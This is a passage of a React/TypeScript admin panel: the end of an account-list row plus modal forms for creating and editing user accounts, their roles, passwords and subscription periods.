  const timeKind = isAdmin ? "is-inf" : suspended ? "is-danger" : cd.kind === "danger" ? "is-danger" : "";

  return (
    <div className="admin-acct-row">
      <div className="admin-acct-main">
        <div className="admin-acct-name-row">
          <span className="admin-acct-name">{a.username}</span>
          <span className={`admin-acct-badge ${isAdmin ? "is-admin" : suspended ? "is-suspended" : ""}`}>
            {isAdmin ? "admin" : suspended ? "suspended" : "paid"}
          </span>
        </div>
        <div className="admin-acct-meta">
          <span className={`m-time ${timeKind}`}>{timeText}</span>
        </div>
      </div>
      <div className="admin-acct-actions">
        <button onClick={onEdit}>Edit</button>
        {!isAdmin && (
          <button className="admin-acct-delete" onClick={() => onDelete(a.id, a.username)}>
            Delete
          </button>
        )}
      </div>
    </div>
  );
}

function CreateAccountModal({
  onClose,
  onCreated,
}: {
  onClose: () => void;
  onCreated: () => void;
}) {
  const create = useServerFn(createAccount);
  const update = useServerFn(updateAccount);
  const [u, setU] = useState("");
  const [p, setP] = useState("");
  const [role, setRole] = useState<"tester" | "admin">("tester");
  const [days, setDays] = useState<number>(30);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    function onKey(e: KeyboardEvent) {
      if (e.key === "Escape") onClose();
    }
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    setBusy(true);
    try {
      const res = await create({ data: { username: u, password: p, isAdmin: role === "admin", isTester: role === "tester" } });
      if (role === "tester" && days > 0) {
        const until = new Date(Date.now() + days * 86_400_000).toISOString();
        await update({ data: { userId: res.id, subscription_until: until } });
      }
      onCreated();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed");
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="admin-modal-backdrop" onClick={onClose}>
      <form className="admin-modal" onClick={(e) => e.stopPropagation()} onSubmit={submit}>
        <div className="admin-modal-head">
          <h2 className="admin-modal-title">Create account</h2>
          <button type="button" className="admin-modal-close" onClick={onClose} aria-label="Close">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
              <line x1="18" y1="6" x2="6" y2="18" />
              <line x1="6" y1="6" x2="18" y2="18" />
            </svg>
          </button>
        </div>

        <label className="admin-modal-field">
          <span>Username</span>
          <input
            autoFocus
            value={u}
            onChange={(e) => setU(e.target.value)}
            required
            minLength={2}
            maxLength={32}
            pattern="[a-zA-Z0-9_-]+"
            autoCapitalize="off"
            spellCheck={false}
          />
        </label>

        <label className="admin-modal-field">
          <span>Password</span>
          <input
            type="text"
            value={p}
            onChange={(e) => setP(e.target.value)}
            required
            minLength={6}
          />
        </label>

        <label className="admin-modal-field">
          <span>Role</span>
          <select value={role} onChange={(e) => setRole(e.target.value as "tester" | "admin")}>
            <option value="tester">Tester</option>
            <option value="admin">Admin (infinite)</option>
          </select>
        </label>

        {role === "tester" && (
          <label className="admin-modal-field">
            <span>Access window (days, 0 = unlimited)</span>
            <input
              type="number"
              min={0}
              max={3650}
              value={days}
              onChange={(e) => setDays(Number(e.target.value) || 0)}
            />
          </label>
        )}

        {error && <div className="auth-error">{error}</div>}

        <div className="admin-modal-actions">
          <button type="button" className="btn-secondary" onClick={onClose} disabled={busy}>
            Cancel
          </button>
          <button type="submit" className="btn-primary" disabled={busy}>
            {busy ? "Creating…" : "Create"}
          </button>
        </div>
      </form>
    </div>
  );
}

function EditAccountModal({
  account,
  onClose,
  onSaved,
}: {
  account: Account;
  onClose: () => void;
  onSaved: () => void;
}) {
  const update = useServerFn(updateAccount);
  const isAdmin = account.roles.includes("admin");
  const [u, setU] = useState(account.username);
  const [p, setP] = useState("");
  const initialDays = account.subscription_until
    ? Math.max(0, Math.ceil((new Date(account.subscription_until).getTime() - Date.now()) / 86_400_000))
    : 0;
  const [days, setDays] = useState<number>(initialDays);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    function onKey(e: KeyboardEvent) {
      if (e.key === "Escape") onClose();
    }
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    setBusy(true);
    try {
      const payload: {
        userId: string;
        username?: string;
        password?: string;
        subscription_until?: string | null;
      } = { userId: account.id };
      if (u !== account.username) payload.username = u;
      if (p) payload.password = p;
      if (!isAdmin) {
        payload.subscription_until =
          days > 0 ? new Date(Date.now() + days * 86_400_000).toISOString() : null;
      }
      await update({ data: payload });
      onSaved();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed");
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="admin-modal-backdrop" onClick={onClose}>
      <form className="admin-modal" onClick={(e) => e.stopPropagation()} onSubmit={submit}>
        <div className="admin-modal-head">
          <h2 className="admin-modal-title">Edit {account.username}</h2>
          <button type="button" className="admin-modal-close" onClick={onClose} aria-label="Close">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
              <line x1="18" y1="6" x2="6" y2="18" />
              <line x1="6" y1="6" x2="18" y2="18" />
            </svg>
          </button>
        </div>

        <label className="admin-modal-field">
          <span>Username</span>
          <input
            value={u}
            onChange={(e) => setU(e.target.value)}
            required
            minLength={2}
            maxLength={32}
            pattern="[a-zA-Z0-9_-]+"
            autoCapitalize="off"
            spellCheck={false}
          />
        </label>

        <label className="admin-modal-field">
          <span>New password (leave blank to keep)</span>
          <input
            type="text"
            value={p}
            onChange={(e) => setP(e.target.value)}
            minLength={6}
            placeholder="••••••••"
          />
        </label>

        {!isAdmin && (
          <label className="admin-modal-field">
            <span>Subscription (days from now)</span>
            <input
              type="number"
              min={0}
              max={3650}
              value={days}
              onChange={(e) => setDays(Number(e.target.value) || 0)}
            />
          </label>
        )}

        {error && <div className="auth-error">{error}</div>}

        <div className="admin-modal-actions">
          <button type="button" className="btn-secondary" onClick={onClose} disabled={busy}>
            Cancel
          </button>
          <button type="submit" className="btn-primary" disabled={busy}>
            {busy ? "Saving…" : "Save"}
          </button>
        </div>
      </form>
    </div>
  );
}
